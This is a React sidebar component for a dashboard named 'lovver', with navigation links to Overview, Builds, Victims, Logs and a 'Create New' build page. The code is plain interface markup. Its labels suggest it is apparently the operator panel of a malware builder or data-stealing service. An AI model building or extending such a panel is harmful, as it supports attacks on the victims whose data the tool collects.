import Link from 'next/link';
import { useId, useState, useEffect } from 'react';
import { useStore } from '@/lib';
import { motion } from 'framer-motion';
import { Disclosure } from '@headlessui/react';
import { CiGrid41, CiHardDrive, CiCreditCard1, CiSatellite1 } from 'react-icons/ci';
import { BsChevronUp, BsPlusLg } from 'react-icons/bs';
import { AiOutlineLeft } from 'react-icons/ai';
import { useRouter } from 'next/router';
import { LogoCustom } from '@/components';

const Sidebar = () => {
  const links = [
    {
      name: 'Overview',
      href: '/@me',
      icon: CiGrid41
    },
    {
      name: 'Builds',
      href: '/@me/builds',
      icon: CiHardDrive
    },
    {
      name: 'Victims',
      href: '/@me/victims',
      icon: CiCreditCard1
    },
    {
      name: 'Logs',
      href: '/@me/logs',
      icon: CiSatellite1
    },
    {
      name: 'Create New',
      href: '/@me/builds/new',
      icon: BsPlusLg,
      collapse: true
    }
  ];

  const [mounted, setMounted] = useState(false);
  const isOpen = useStore((state) => state.isOpen);
  const setOpen = useStore((state) => state.setOpen);
  const router = useRouter();
  const id = useId();

  useEffect(() => setMounted(true), []);
  if (!mounted) return null;

  return (
    <>
      <motion.nav
        animate={isOpen ? 'open' : 'closed'}
        className="z-10 h-full fixed lg:relative w-full lg:w-[300px]"
        variants={{
          open: { opacity: 1, x: 0 },
          closed: { opacity: 0, x: '-100%', display: `none` }
        }}
      >
        <aside className="w-full lg:w-[300px] h-full py-6 px-5 bg-white dark:bg-[#010101] border-r border-gray-300 dark:border-[#111]">
          <div className="flex items-center mb-6">
            <Link className="flex items-center gap-4 px-3" href="/@me">
              <LogoCustom />
              <h1 className="text-md font-extrabold font-mono">lovver</h1>
            </Link>
            <button
              className="flex items-center justify-end w-full text-gray-300 hover:text-gray-600 dark:hover:text-white cursor-pointer"
              onClick={() => setOpen(false)}
            >
              <AiOutlineLeft />
            </button>
          </div>
          <div className="mt-6 transition-all">
            {links
              .filter(({ collapse }) => !collapse)
              .map(({ name, href, icon: ItemIcon }) => (
                <Link
                  href={href}
                  key={id}
                  className={`${
                    router.asPath === href ? 'text-black dark:text-white' : 'text-gray-500 dark:text-[#a3a3a3]'
                  } h-10 text-left text-sm cursor-pointer py-2 px-3 rounded-sm group relative flex items-center max-w-full hover:text-gray-700 dark:hover:text-[#f2f4fb] gap-4`}
                >
                  <div className="w-6">
                    <ItemIcon height={24} width={24} />
                  </div>
                  <div className="flex flex-1 items-center justify-between transition-all opacity-1 pointer-events-auto">
                    <p className="flex flex-1 transition-all whitespace-nowrap text-ellipsis">{name}</p>
                  </div>
                </Link>
              ))}

            <Disclosure as="div" defaultOpen={true}>
              {({ open }) => (
                <>
                  <Disclosure.Button className="select-none flex items-center justify-between cursor-pointer h-[40px]">
                    <div className="flex items-center">
                      <span className="ml-[12px] whitespace-nowrap text-ellipsis uppercase text-xs tracking-[1px] font-bold text-black/80 dark:text-white/80">
                        Manage Builds
                      </span>
                      <button className="ml-[12px]">
                        <BsChevronUp
                          className={`${
                            open ? 'rotate-180 transform' : ''
                          } text-xs text-[#a3a3a3] hover:text-gray-700 dark:hover:text-[#f2f4fb]`}
                        />
                      </button>
                    </div>
                  </Disclosure.Button>
                  <Disclosure.Panel>
                    {links
                      .filter(({ collapse }) => collapse === true)
                      .map(({ name, href, icon: ItemIcon }) => (
                        <Link
                          href={href}
                          key={id}
                          className={`${
                            router.asPath === href ? 'text-black dark:text-white' : 'text-gray-500 dark:text-[#a3a3a3]'
                          } h-10 text-left text-sm cursor-pointer py-2 px-3 rounded-sm group relative flex items-center max-w-full hover:text-gray-700 dark:hover:text-[#f2f4fb] gap-4`}
                        >
                          <div className="w-6">
                            <ItemIcon height={24} width={24} />
                          </div>
                          <div className="flex flex-1 items-center justify-between transition-all opacity-1 pointer-events-auto">
                            <p className="flex flex-1 transition-all whitespace-nowrap text-ellipsis">{name}</p>
                          </div>
                        </Link>
                      ))}
                  </Disclosure.Panel>
                </>
              )}
            </Disclosure>
          </div>
        </aside>
      </motion.nav>
    </>
  );
};

export default Sidebar;
